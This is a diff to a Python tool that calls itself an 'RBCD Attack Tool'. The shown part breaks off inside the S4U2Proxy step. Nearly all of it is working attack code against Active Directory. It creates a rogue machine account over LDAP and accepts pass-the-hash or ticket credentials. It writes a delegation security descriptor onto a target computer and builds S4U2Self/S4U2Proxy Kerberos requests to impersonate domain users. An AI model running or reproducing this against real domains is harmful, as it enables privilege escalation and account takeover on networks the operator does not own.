@@ -1,142 +1,285 @@
-  #!/usr/bin/env python3
-
+#!/usr/bin/env python3
 
 
 import sys
 import os
 import time
 import re
+import signal
 import logging
 import random
 import datetime
 import struct
+import ssl
 from pathlib import Path
 from typing import Optional, List, Tuple, Dict, Any
 from binascii import hexlify, unhexlify
 from six import ensure_binary
 
-# ─────────────────────────────────────────────────────────────────────────────
-# DEPENDENCY CHECK
-# ─────────────────────────────────────────────────────────────────────────────
-try:
-    from colorama import init, Fore, Style
-    init(autoreset=True)
-except ImportError:
-    print("[!] colorama not found: pip install colorama")
-    sys.exit(1)
+from colorama import Fore, Style, init
+from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD, MODIFY_DELETE, MODIFY_REPLACE, SUBTREE, Tls
+from ldap3.core.exceptions import LDAPBindError
+from ldap3.protocol.formatters.formatters import format_sid
 
-try:
-    import ldap3
-    from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD, MODIFY_DELETE, MODIFY_REPLACE
-    from ldap3.protocol.formatters.formatters import format_sid
-except ImportError:
-    print("[!] ldap3 not found: pip install ldap3")
-    sys.exit(1)
+from pyasn1.codec.der import decoder, encoder
+from pyasn1.type.univ import noValue
 
-try:
-    from pyasn1.codec.der import decoder, encoder
-    from pyasn1.type.univ import noValue
+from impacket.krb5.ccache import CCache
+from impacket.krb5 import constants
+from impacket.krb5.asn1 import (
+    AS_REP, TGS_REQ, TGS_REP, Ticket as TicketAsn1,
+    EncTGSRepPart, AP_REQ, Authenticator,
+    seq_set, seq_set_iter,
+    PA_FOR_USER_ENC, PA_PAC_OPTIONS
+)
+from impacket.krb5.crypto import Key, _HMACMD5
+from impacket.krb5.types import Principal, KerberosTime, Ticket
+from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
+from impacket.ldap import ldaptypes
 
-    from impacket.krb5.ccache import CCache
-    from impacket.krb5 import constants
-    from impacket.krb5.asn1 import (
-        AS_REP, TGS_REQ, TGS_REP, Ticket as TicketAsn1,
-        EncTGSRepPart, AP_REQ, Authenticator,
-        seq_set, seq_set_iter,
-        PA_FOR_USER_ENC, PA_PAC_OPTIONS
-    )
-    from impacket.krb5.crypto import Key, _HMACMD5
-    from impacket.krb5.types import Principal, KerberosTime, Ticket
-    from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
-    from impacket.ldap import ldaptypes
-except ImportError as e:
-    print(f"[!] Missing dependency: {e}\n    pip install impacket pyasn1 six")
-    sys.exit(1)
 
 # ─────────────────────────────────────────────────────────────────────────────
-# LOGGING
+# INIT
 # ─────────────────────────────────────────────────────────────────────────────
-logging.SUCCESS = 25
-logging.addLevelName(logging.SUCCESS, "SUCCESS")
-ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")
+init(autoreset=True)
+logging.getLogger().setLevel(logging.ERROR)
 
 
-class _ColorFormatter(logging.Formatter):
-    PREFIXES = {
-        logging.SUCCESS: f"{Fore.GREEN}[+]{Style.RESET_ALL}",
-        logging.ERROR:   f"{Fore.RED}[-]{Style.RESET_ALL}",
-        logging.WARNING: f"{Fore.YELLOW}[!]{Style.RESET_ALL}",
-        logging.INFO:    f"{Fore.BLUE}[*]{Style.RESET_ALL}",
-    }
-    def format(self, record):
-        record.msg = f"{self.PREFIXES.get(record.levelno, '')} {record.msg}"
-        return super().format(record)
+# ─────────────────────────────────────────────────────────────────────────────
+# SIGNAL HANDLER
+# ─────────────────────────────────────────────────────────────────────────────
+def _exit_handler(sig, frame):
+    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
+    sys.exit(0)
 
-
-class _FileFormatter(logging.Formatter):
-    def format(self, record):
-        record.msg = ANSI_RE.sub("", str(record.msg))
-        return super().format(record)
-
-
-def _build_logger() -> logging.Logger:
-    logger = logging.getLogger("RBCD")
-    logger.setLevel(logging.DEBUG)
-    ch = logging.StreamHandler(sys.stdout)
-    ch.setFormatter(_ColorFormatter("%(message)s"))
-    logger.addHandler(ch)
-    fh = logging.FileHandler("rbcd_attack.log", encoding="utf-8")
-    fh.setFormatter(_FileFormatter("%%(asctime)s [%(levelname)-7s] %(message)s"))
-    logger.addHandler(fh)
-    logger.success = lambda msg: logger.log(logging.SUCCESS, msg)
-    return logger
+signal.signal(signal.SIGINT, _exit_handler)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
 # BANNER
 # ─────────────────────────────────────────────────────────────────────────────
-def _banner() -> str:
-    return (
-        f"{Fore.CYAN}\n"
-        "╔══════════════════════════════════════════════════════════════╗\n"
-        f"║  {Fore.RED}██████╗ ██████╗  ██████╗██████╗     █████╗ ████████╗████████╗{Fore.CYAN}  ║\n"
-        f"║  {Fore.RED}██╔══██╗██╔══██╗██╔════╝██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝{Fore.CYAN}  ║\n"
-        f"║  {Fore.RED}██████╔╝██████╔╝██║     ██║  ██║   ███████║   ██║      ██║   {Fore.CYAN}  ║\n"
-        f"║  {Fore.RED}██╔══██╗██╔══██╗██║     ██║  ██║   ██╔══██║   ██║      ██║   {Fore.CYAN}  ║\n"
-        f"║  {Fore.RED}██║  ██║██████╔╝╚██████╗██████╔╝   ██║  ██║   ██║      ██║   {Fore.CYAN}  ║\n"
-        f"║  {Fore.RED}╚═╝  ╚═╝╚═════╝  ╚═════╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝  {Fore.CYAN}   ║\n"
-        f"║                                                                                      ║\n"
-        f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}"
-    )
+def banner():
+    print(Fore.CYAN + """
+    ╔══════════════════════════════════════════════════════════════╗
+    ║                     RBCD Attack Tool                         ║
+    ║  Resource-Based Constrained Delegation via LDAP & Kerberos   ║
+    ╚══════════════════════════════════════════════════════════════╝
+    """ + Style.RESET_ALL)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# VALIDATORS
+# ─────────────────────────────────────────────────────────────────────────────
+def validate_ip(ip):
+    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
+    if not re.match(pattern, ip):
+        return False
+    return all(0 <= int(p) <= 255 for p in ip.split('.'))
+
+
+def validate_domain(domain):
+    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
+    if not re.match(pattern, domain):
+        return False
+    for part in domain.split('.'):
+        if part.startswith('-') or part.endswith('-') or not part:
+            return False
+    return True
+
+
+def validate_password(password):
+    return len(password) >= 7
+
+
+def validate_hash(hash_str):
+    if ':' in hash_str:
+        parts = hash_str.split(':')
+        if len(parts) == 2:
+            lm, nt = parts
+            return len(lm) == 32 and len(nt) == 32 and all(c in '0123456789abcdefABCDEF' for c in lm + nt)
+        return False
+    else:
+        return len(hash_str) == 32 and all(c in '0123456789abcdefABCDEF' for c in hash_str)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# INPUT HELPER
+# ─────────────────────────────────────────────────────────────────────────────
+def get_input(prompt, validator=None, error_msg=None, allow_empty=False, default=""):
+    while True:
+        try:
+            value = input(prompt).strip()
+            if not value and not allow_empty:
+                if default:
+                    return default
+                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
+                continue
+            if not value and allow_empty:
+                return default
+            if validator and value and not validator(value):
+                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
+                continue
+            return value
+        except KeyboardInterrupt:
+            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
+            sys.exit(0)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# UTILITY FUNCTIONS
+# ─────────────────────────────────────────────────────────────────────────────
+def get_base_dn(domain):
+    return ','.join([f"DC={part}" for part in domain.split('.')])
+
+
+def check_ip_reachable(ip):
+    import socket
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        result = sock.connect_ex((ip, 636))
+        sock.close()
+        if result == 0:
+            return True
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        result = sock.connect_ex((ip, 389))
+        sock.close()
+        return result == 0
+    except Exception:
+        return False
+
+
+def check_credentials_and_domain(dc_ip, domain, username, password, auth_type='password', lmhash='', nthash='', ticket_file=''):
+    if auth_type == 'password':
+        try:
+            base_dn = get_base_dn(domain)
+            tls = Tls(validate=ssl.CERT_NONE)
+            server = Server(dc_ip, port=636, use_ssl=True, tls=tls, get_info=ALL, connect_timeout=5)
+            conn = Connection(
+                server,
+                user=f"{domain}\\{username}",
+                password=password,
+                authentication=NTLM,
+                auto_bind=True
+            )
+            conn.search(
+                search_base=base_dn,
+                search_filter='(objectClass=domain)',
+                search_scope=SUBTREE,
+                attributes=['dc']
+            )
+            result = len(conn.entries) > 0
+            conn.unbind()
+            return result
+        except LDAPBindError:
+            return "invalid_credentials"
+        except Exception:
+            try:
+                base_dn = get_base_dn(domain)
+                server = Server(dc_ip, get_info=ALL, connect_timeout=5)
+                conn = Connection(
+                    server,
+                    user=f"{domain}\\{username}",
+                    password=password,
+                    authentication=NTLM,
+                    auto_bind=True
+                )
+                conn.search(
+                    search_base=base_dn,
+                    search_filter='(objectClass=domain)',
+                    search_scope=SUBTREE,
+                    attributes=['dc']
+                )
+                result = len(conn.entries) > 0
+                conn.unbind()
+                return result
+            except LDAPBindError:
+                return "invalid_credentials"
+            except Exception:
+                return False
+    else:
+        try:
+            from impacket.dcerpc.v5 import transport, samr
+            string_binding = f'ncacn_np:{dc_ip}[\\pipe\\samr]'
+            tr = transport.DCERPCTransportFactory(string_binding)
+
+            if auth_type == 'hash':
+                tr.set_credentials(username, '', domain, lmhash, nthash)
+            elif auth_type == 'ticket':
+                tr.set_credentials(username, '', domain, '', '')
+                tr.set_kerberos(True, kdcHost=dc_ip)
+                if ticket_file and os.path.exists(ticket_file):
+                    os.environ['KRB5CCNAME'] = ticket_file
+
+            dce = tr.get_dce_rpc()
+            dce.connect()
+            dce.bind(samr.MSRPC_UUID_SAMR)
+
+            resp = samr.hSamrConnect(dce)
+            server_hd = resp['ServerHandle']
+
+            resp = samr.hSamrLookupDomainInSamServer(dce, server_hd, domain.split('.')[0].upper())
+
+            samr.hSamrCloseHandle(dce, server_hd)
+            dce.disconnect()
+            return True
+        except Exception as e:
+            err = str(e).lower()
+            if any(x in err for x in ['logon failure', 'access_denied', 'invalid_credentials', 'status_logon_failure', 'sec_e_logon_denied']):
+                return "invalid_credentials"
+            return False
 
 
 # ─────────────────────────────────────────────────────────────────────────────
 # LDAP CLIENT
 # ─────────────────────────────────────────────────────────────────────────────
 class LDAPClient:
-    def __init__(self, dc_ip: str, domain: str, username: str, password: str, log: logging.Logger):
-        self.dc_ip    = dc_ip
-        self.domain   = domain
+    def __init__(self, dc_ip, domain, username, password, auth_type='password', lmhash='', nthash='', ticket_file=''):
+        self.dc_ip = dc_ip
+        self.domain = domain
         self.username = username
         self.password = password
-        self.log      = log
-        self.base_dn  = ",".join([f"DC={x}" for x in domain.split(".")])
-        self.conn: Optional[Connection] = None
+        self.auth_type = auth_type
+        self.lmhash = lmhash
+        self.nthash = nthash
+        self.ticket_file = ticket_file
+        self.base_dn = get_base_dn(domain)
+        self.conn = None
 
-    def connect(self) -> bool:
+    def connect(self):
+        if self.auth_type != 'password':
+            return False
         try:
-            server = Server(self.dc_ip, port=636, get_info=ALL, use_ssl=True)
+            tls = Tls(validate=ssl.CERT_NONE)
+            server = Server(self.dc_ip, port=636, use_ssl=True, tls=tls, get_info=ALL, connect_timeout=5)
             self.conn = Connection(
                 server,
-                user=f"{self.domain}\{self.username}",
+                user=f"{self.domain}\\{self.username}",
                 password=self.password,
                 authentication=NTLM,
                 auto_bind=True
             )
-            self.log.success(f"LDAPS connected: {self.dc_ip}:636")
+            print(Fore.GREEN + "[+] Connected via LDAPS (port 636)" + Style.RESET_ALL)
             return True
+        except Exception:
+            pass
+        try:
+            server = Server(self.dc_ip, get_info=ALL, connect_timeout=5)
+            self.conn = Connection(
+                server,
+                user=f"{self.domain}\\{self.username}",
+                password=self.password,
+                authentication=NTLM,
+                auto_bind=True
+            )
+            print(Fore.YELLOW + "[!] Connected via LDAP (port 389) - some operations may require LDAPS" + Style.RESET_ALL)
+            return True
+        except LDAPBindError:
+            print(Fore.RED + "[-] Invalid credentials!" + Style.RESET_ALL)
+            return False
         except Exception as e:
-            self.log.error(f"LDAPS connection failed: {e}")
+            print(Fore.RED + f"[-] LDAP connection failed: {e}" + Style.RESET_ALL)
             return False
 
     def disconnect(self):
@@ -146,11 +289,11 @@ class LDAPClient:
             except:
                 pass
 
-    def search(self, filter_str: str, attributes: List[str] = None) -> List[Dict[str, Any]]:
+    def search(self, filter_str, attributes=None):
         if not self.conn:
             return []
         try:
-            self.conn.search(self.base_dn, filter_str, attributes=attributes or ['*'])
+            self.conn.search(self.base_dn, filter_str, search_scope=SUBTREE, attributes=attributes or ['*'])
             results = []
             for entry in self.conn.entries:
                 result_dict = {'dn': entry.entry_dn, 'attributes': {}}
@@ -159,18 +302,15 @@ class LDAPClient:
                 results.append(result_dict)
             return results
         except Exception as e:
-            self.log.warning(f"LDAP search failed: {e}")
+            print(Fore.RED + f"[-] LDAP search failed: {e}" + Style.RESET_ALL)
             return []
 
-    def get_computer_info(self, computer_name: str) -> Optional[Dict[str, Any]]:
+    def get_computer_info(self, computer_name):
         filter_str = f"(&(objectClass=computer)(sAMAccountName={computer_name}$))"
-        results = self.search(
-            filter_str,
-            attributes=['dNSHostName', 'servicePrincipalName', 'distinguishedName', 'objectSid']
-        )
+        results = self.search(filter_str, attributes=['dNSHostName', 'servicePrincipalName', 'distinguishedName', 'objectSid'])
         return results[0] if results else None
 
-    def enumerate_computers(self) -> List[str]:
+    def enumerate_computers(self):
         filter_str = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
         results = self.search(filter_str, attributes=['sAMAccountName'])
         computers = []
@@ -180,87 +320,125 @@ class LDAPClient:
                 computers.append(sam.rstrip('$'))
         return computers
 
-    def modify_attribute(self, dn: str, attribute: str, operation: int, values: List[Any]) -> bool:
+    def modify_attribute(self, dn, attribute, operation, values):
         if not self.conn:
             return False
         try:
             self.conn.modify(dn, {attribute: [(operation, values)]})
             if self.conn.result['result'] == 0:
                 return True
-            self.log.warning(f"LDAP modify failed: {self.conn.result['description']}")
+            print(Fore.YELLOW + f"[!] LDAP modify failed: {self.conn.result['description']}" + Style.RESET_ALL)
             return False
         except Exception as e:
-            self.log.warning(f"LDAP modify error: {e}")
+            print(Fore.RED + f"[-] LDAP modify error: {e}" + Style.RESET_ALL)
             return False
 
-    def add_object(self, dn: str, object_class: List[str], attributes: Dict[str, Any]) -> bool:
+    def add_object(self, dn, object_class, attributes):
         if not self.conn:
             return False
         try:
             self.conn.add(dn, object_class=object_class, attributes=attributes)
             if self.conn.result['result'] == 0:
                 return True
-            self.log.warning(f"LDAP add failed: {self.conn.result['description']}")
+            desc = str(self.conn.result.get('description', ''))
+            if 'entryAlreadyExists' in desc or 'ENTRY_ALREADY_EXISTS' in desc:
+                print(Fore.YELLOW + f"[!] Object already exists: {dn}" + Style.RESET_ALL)
+                return "exists"
+            print(Fore.YELLOW + f"[!] LDAP add failed: {self.conn.result['description']}" + Style.RESET_ALL)
             return False
         except Exception as e:
-            self.log.warning(f"LDAP add error: {e}")
+            print(Fore.RED + f"[-] LDAP add error: {e}" + Style.RESET_ALL)
             return False
 
-    def delete_object(self, dn: str) -> bool:
+    def delete_object(self, dn):
         if not self.conn:
             return False
         try:
             self.conn.delete(dn)
             if self.conn.result['result'] == 0:
                 return True
-            self.log.warning(f"LDAP delete failed: {self.conn.result['description']}")
+            print(Fore.YELLOW + f"[!] LDAP delete failed: {self.conn.result['description']}" + Style.RESET_ALL)
             return False
         except Exception as e:
-            self.log.warning(f"LDAP delete error: {e}")
+            print(Fore.RED + f"[-] LDAP delete error: {e}" + Style.RESET_ALL)
             return False
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SECURITY DESCRIPTOR HELPERS
+# ─────────────────────────────────────────────────────────────────────────────
+def create_empty_sd():
+    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
+    sd['Revision'] = b'\x01'
+    sd['Sbz1'] = b'\x00'
+    sd['Control'] = 32772
+    sd['OwnerSid'] = ldaptypes.LDAP_SID()
+    sd['OwnerSid'].fromCanonical('S-1-5-32-544')
+    sd['GroupSid'] = b''
+    sd['Sacl'] = b''
+    acl = ldaptypes.ACL()
+    acl['AclRevision'] = 4
+    acl['Sbz1'] = 0
+    acl['Sbz2'] = 0
+    acl.aces = []
+    sd['Dacl'] = acl
+    return sd
+
+
+def create_allow_ace(sid_str):
+    nace = ldaptypes.ACE()
+    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+    nace['AceFlags'] = 0x00
+    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
+    acedata['Mask'] = ldaptypes.ACCESS_MASK()
+    acedata['Mask']['Mask'] = 983551
+    acedata['Sid'] = ldaptypes.LDAP_SID()
+    acedata['Sid'].fromCanonical(sid_str)
+    nace['Ace'] = acedata
+    return nace
 
 
 # ─────────────────────────────────────────────────────────────────────────────
 # AD OPERATIONS
 # ─────────────────────────────────────────────────────────────────────────────
 class ADOperations:
-    def __init__(self, dc_ip: str, domain: str, username: str, password: str, log: logging.Logger):
-        self.dc_ip    = dc_ip
-        self.domain   = domain
+    def __init__(self, dc_ip, domain, username, password, auth_type='password', lmhash='', nthash='', ticket_file=''):
+        self.dc_ip = dc_ip
+        self.domain = domain
         self.username = username
         self.password = password
-        self.log      = log
-        self.ldap     = LDAPClient(dc_ip, domain, username, password, log)
+        self.auth_type = auth_type
+        self.lmhash = lmhash
+        self.nthash = nthash
+        self.ticket_file = ticket_file
+        self.ldap = LDAPClient(dc_ip, domain, username, password, auth_type, lmhash, nthash, ticket_file)
 
-    def create_computer_account(self, computer_name: str, computer_password: str) -> bool:
+    def create_computer_account(self, computer_name, computer_password):
         if not self.ldap.connect():
             return False
         try:
             computer_sam = computer_name.rstrip('$')
-            base_dn      = ",".join([f"DC={x}" for x in self.domain.split(".")])
-            computer_dn  = f"CN={computer_sam},CN=Computers,{base_dn}"
+            base_dn = get_base_dn(self.domain)
+            computer_dn = f"CN={computer_sam},CN=Computers,{base_dn}"
             base_attrs = {
-                'objectClass':        ['top', 'person', 'organizationalPerson', 'user', 'computer'],
-                'sAMAccountName':     computer_name,
+                'objectClass': ['top', 'person', 'organizationalPerson', 'user', 'computer'],
+                'sAMAccountName': computer_name,
                 'userAccountControl': 4096,
             }
-            if not self.ldap.add_object(computer_dn, ['computer'], base_attrs):
-                desc = str(self.ldap.conn.result.get('description', ''))
-                if 'entryAlreadyExists' in desc or 'ENTRY_ALREADY_EXISTS' in desc:
-                    self.log.warning(f"Computer already exists, reusing: {computer_name}")
-                else:
-                    self.log.error("Initial computer creation failed")
-                    return False
+            result = self.ldap.add_object(computer_dn, ['computer'], base_attrs)
+            if result == "exists":
+                print(Fore.YELLOW + f"[!] Computer already exists, reusing: {computer_name}" + Style.RESET_ALL)
+            elif not result:
+                return False
+
             if not self.ldap.modify_attribute(
                 computer_dn, 'unicodePwd', MODIFY_REPLACE,
                 [f'"{computer_password}"'.encode('utf-16-le')]
             ):
-                self.log.error("Failed to set computer password (ensure LDAPS on port 636)")
+                print(Fore.RED + "[-] Failed to set computer password (ensure LDAPS on port 636)" + Style.RESET_ALL)
                 return False
-            self.ldap.modify_attribute(
-                computer_dn, 'dNSHostName', MODIFY_REPLACE,
-                [f"{computer_sam}.{self.domain}"]
-            )
+
+            self.ldap.modify_attribute(computer_dn, 'dNSHostName', MODIFY_REPLACE, [f"{computer_sam}.{self.domain}"])
             self.ldap.modify_attribute(
                 computer_dn, 'servicePrincipalName', MODIFY_REPLACE,
                 [
@@ -270,44 +448,15 @@ class ADOperations:
                     f'RestrictedKrbHost/{computer_sam}.{self.domain}',
                 ]
             )
-            self.log.success(f"Computer account created: {computer_name}")
+            print(Fore.GREEN + f"[+] Computer account created: {computer_name}" + Style.RESET_ALL)
             return True
         except Exception as e:
-            self.log.error(f"Computer creation error: {e}")
+            print(Fore.RED + f"[-] Computer creation error: {e}" + Style.RESET_ALL)
             return False
         finally:
             self.ldap.disconnect()
 
-    def _create_empty_sd(self):
-        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
-        sd['Revision'] = b'\x01'
-        sd['Sbz1']     = b'\x00'
-        sd['Control']  = 32772
-        sd['OwnerSid'] = ldaptypes.LDAP_SID()
-        sd['OwnerSid'].fromCanonical('S-1-5-32-544')
-        sd['GroupSid'] = b''
-        sd['Sacl']     = b''
-        acl = ldaptypes.ACL()
-        acl['AclRevision'] = 4
-        acl['Sbz1']        = 0
-        acl['Sbz2']        = 0
-        acl.aces           = []
-        sd['Dacl']         = acl
-        return sd
-
-    def _create_allow_ace(self, sid_str: str):
-        nace = ldaptypes.ACE()
-        nace['AceType']  = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
-        nace['AceFlags'] = 0x00
-        acedata = ldaptypes.ACCESS_ALLOWED_ACE()
-        acedata['Mask'] = ldaptypes.ACCESS_MASK()
-        acedata['Mask']['Mask'] = 983551
-        acedata['Sid'] = ldaptypes.LDAP_SID()
-        acedata['Sid'].fromCanonical(sid_str)
-        nace['Ace'] = acedata
-        return nace
-
-    def set_rbcd_delegation(self, delegate_from: str, delegate_to: str) -> bool:
+    def set_rbcd_delegation(self, delegate_from, delegate_to):
         if not self.ldap.connect():
             return False
         try:
@@ -315,6 +464,7 @@ class ADOperations:
             self.ldap.conn.search(
                 self.ldap.base_dn,
                 target_filter,
+                search_scope=SUBTREE,
                 attributes=['sAMAccountName', 'msDS-AllowedToActOnBehalfOfOtherIdentity']
             )
             target_entry = None
@@ -323,7 +473,7 @@ class ADOperations:
                     target_entry = entry
                     break
             if not target_entry:
-                self.log.error(f"Target not found: {delegate_to}")
+                print(Fore.RED + f"[-] Target not found: {delegate_to}" + Style.RESET_ALL)
                 return False
             target_dn = target_entry['dn']
 
@@ -331,6 +481,7 @@ class ADOperations:
             self.ldap.conn.search(
                 self.ldap.base_dn,
                 delegate_filter,
+                search_scope=SUBTREE,
                 attributes=['objectSid']
             )
             delegate_entry = None
@@ -339,32 +490,32 @@ class ADOperations:
                     delegate_entry = entry
                     break
             if not delegate_entry:
-                self.log.error(f"Delegate not found: {delegate_from}")
+                print(Fore.RED + f"[-] Delegate not found: {delegate_from}" + Style.RESET_ALL)
                 return False
 
             raw_sid_bytes = delegate_entry['raw_attributes']['objectSid'][0]
             sid_str = format_sid(raw_sid_bytes)
-            self.log.info(f"SID (via format_sid from raw bytes): {sid_str}")
+            print(Fore.BLUE + f"[*] SID: {sid_str}" + Style.RESET_ALL)
 
             existing_sd_raw = target_entry['raw_attributes'].get(
                 'msDS-AllowedToActOnBehalfOfOtherIdentity', [b'']
             )
             if existing_sd_raw and existing_sd_raw[0]:
                 sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=existing_sd_raw[0])
-                self.log.info("Loaded existing Security Descriptor")
+                print(Fore.BLUE + "[*] Loaded existing Security Descriptor" + Style.RESET_ALL)
             else:
-                sd = self._create_empty_sd()
-                self.log.info("Created new empty Security Descriptor")
+                sd = create_empty_sd()
+                print(Fore.BLUE + "[*] Created new empty Security Descriptor" + Style.RESET_ALL)
 
             existing_sids = [
                 ace['Ace']['Sid'].formatCanonical()
                 for ace in sd['Dacl'].aces
             ]
             if sid_str not in existing_sids:
-                sd['Dacl'].aces.append(self._create_allow_ace(sid_str))
-                self.log.info(f"ACE added for SID: {sid_str}")
+                sd['Dacl'].aces.append(create_allow_ace(sid_str))
+                print(Fore.BLUE + f"[*] ACE added for SID: {sid_str}" + Style.RESET_ALL)
             else:
-                self.log.warning(f"SID {sid_str} already present — no changes needed")
+                print(Fore.YELLOW + f"[!] SID {sid_str} already present — no changes needed" + Style.RESET_ALL)
 
             self.ldap.conn.modify(
                 target_dn,
@@ -373,35 +524,35 @@ class ADOperations:
                 ]}
             )
             if self.ldap.conn.result['result'] == 0:
-                self.log.success(f"RBCD set: {delegate_from} → {delegate_to}")
+                print(Fore.GREEN + f"[+] RBCD set: {delegate_from} → {delegate_to}" + Style.RESET_ALL)
                 return True
             else:
-                self.log.error(f"LDAP modify failed: {self.ldap.conn.result['description']}")
+                print(Fore.RED + f"[-] LDAP modify failed: {self.ldap.conn.result['description']}" + Style.RESET_ALL)
                 return False
         except Exception as e:
-            self.log.error(f"RBCD delegation error: {e}", exc_info=True)
+            print(Fore.RED + f"[-] RBCD delegation error: {e}" + Style.RESET_ALL)
             return False
         finally:
             self.ldap.disconnect()
 
-    def delete_computer_account(self, computer_name: str) -> bool:
+    def delete_computer_account(self, computer_name):
         if not self.ldap.connect():
             return False
         try:
             computer_sam = computer_name.rstrip('$')
-            base_dn      = ",".join([f"DC={x}" for x in self.domain.split(".")])
-            computer_dn  = f"CN={computer_sam},CN=Computers,{base_dn}"
+            base_dn = get_base_dn(self.domain)
+            computer_dn = f"CN={computer_sam},CN=Computers,{base_dn}"
             if self.ldap.delete_object(computer_dn):
-                self.log.success(f"Computer account deleted: {computer_name}")
+                print(Fore.GREEN + f"[+] Computer account deleted: {computer_name}" + Style.RESET_ALL)
                 return True
             return False
         except Exception as e:
-            self.log.warning(f"Computer deletion error: {e}")
+            print(Fore.YELLOW + f"[!] Computer deletion error: {e}" + Style.RESET_ALL)
             return False
         finally:
             self.ldap.disconnect()
 
-    def remove_rbcd_delegation(self, delegate_from: str, delegate_to: str) -> bool:
+    def remove_rbcd_delegation(self, delegate_from, delegate_to):
         if not self.ldap.connect():
             return False
         try:
@@ -414,10 +565,10 @@ class ADOperations:
                 'msDS-AllowedToActOnBehalfOfOtherIdentity',
                 MODIFY_DELETE, []
             )
-            self.log.success("RBCD delegation removed")
+            print(Fore.GREEN + "[+] RBCD delegation removed" + Style.RESET_ALL)
             return True
         except Exception as e:
-            self.log.warning(f"RBCD removal error: {e}")
+            print(Fore.YELLOW + f"[!] RBCD removal error: {e}" + Style.RESET_ALL)
             return False
         finally:
             self.ldap.disconnect()
@@ -427,19 +578,13 @@ class ADOperations:
 # S4U HELPER
 # ─────────────────────────────────────────────────────────────────────────────
 class S4UHelper:
-    """
-    Manual S4U2Self → S4U2Proxy implementation.
-    """
-
-    def __init__(self, domain: str, dc_host: str, machine_sam: str,
-                 machine_password: str, log: logging.Logger):
-        self.domain           = domain
-        self.dc_host          = dc_host
-        self.machine_sam      = machine_sam      # no $ suffix
+    def __init__(self, domain, dc_host, machine_sam, machine_password):
+        self.domain = domain
+        self.dc_host = dc_host
+        self.machine_sam = machine_sam
         self.machine_password = machine_password
-        self.log              = log
 
-    def _build_ap_req(self, tgt_raw, cipher, session_key) -> bytes:
+    def _build_ap_req(self, tgt_raw, cipher, session_key):
         decoded_tgt = decoder.decode(tgt_raw, asn1Spec=AS_REP())[0]
         ticket = Ticket()
         ticket.from_asn1(decoded_tgt['ticket'])
@@ -466,7 +611,7 @@ class S4UHelper:
         ap_req['authenticator']['cipher'] = enc_auth
         return encoder.encode(ap_req)
 
-    def _s4u2self(self, tgt_raw, cipher, session_key, impersonate: str) -> bytes:
+    def _s4u2self(self, tgt_raw, cipher, session_key, impersonate):
         ap_req_encoded = self._build_ap_req(tgt_raw, cipher, session_key)
         decoded_tgt = decoder.decode(tgt_raw, asn1Spec=AS_REP())[0]
 
@@ -484,7 +629,7 @@ class S4UHelper:
         pa_for_user['userRealm'] = self.domain
         pa_for_user['cksum'] = noValue
         pa_for_user['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
-        pa_for_user['cksum']['checksum']  = checksum
+        pa_for_user['cksum']['checksum'] = checksum
         pa_for_user['auth-package'] = 'Kerberos'
 
         tgs_req = TGS_REQ()
@@ -509,7 +654,7 @@ class S4UHelper:
         server_name = Principal(self.machine_sam, type=constants.PrincipalNameType.NT_UNKNOWN.value)
         seq_set(req_body, 'sname', server_name.components_to_asn1)
         req_body['realm'] = str(decoded_tgt['crealm'])
-        req_body['till']  = KerberosTime.to_asn1(
+        req_body['till'] = KerberosTime.to_asn1(
             datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
         )
         req_body['nonce'] = random.getrandbits(31)
@@ -518,13 +663,13 @@ class S4UHelper:
             int(constants.EncryptionTypes.rc4_hmac.value),
         ))
 
-        self.log.info("Sending S4U2Self request to KDC...")
+        print(Fore.BLUE + "[*] Sending S4U2Self request to KDC..." + Style.RESET_ALL)
         return sendReceive(encoder.encode(tgs_req), self.domain, self.dc_host)
 
-    def _s4u2proxy(self, tgt_raw, cipher, session_key, tgs_self_raw, spn: str) -> bytes:
-        ap_req_encoded  = self._build_ap_req(tgt_raw, cipher, session_key)
-        decoded_tgt     = decoder.decode(tgt_raw,      asn1Spec=AS_REP())[0]
-        decoded_self    = decoder.decode(tgs_self_raw, asn1Spec=TGS_REP())[0]
+    def _s4u2proxy(self, tgt_raw, cipher, session_key, tgs_self_raw, spn):
+        ap_req_encoded = self._build_ap_req(tgt_raw, cipher, session_key)
+        decoded_tgt = decoder.decode(tgt_raw, asn1Spec=AS_REP())[0]
+        decoded_self = decoder.decode(tgs_self_raw, asn1Spec=TGS_REP())[0]
 
         ticket_self = Ticket()
         ticket_self.from_asn1(decoded_self['ticket'])
@@ -557,7 +702,7 @@ class S4UHelper:
         service_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
         seq_set(req_body, 'sname', service_name.components_to_asn1)
         req_body['realm'] = self.domain
-        req_body['till']  = KerberosTime.to_asn1(
+        req_body['till'] = KerberosTime.to_asn1(
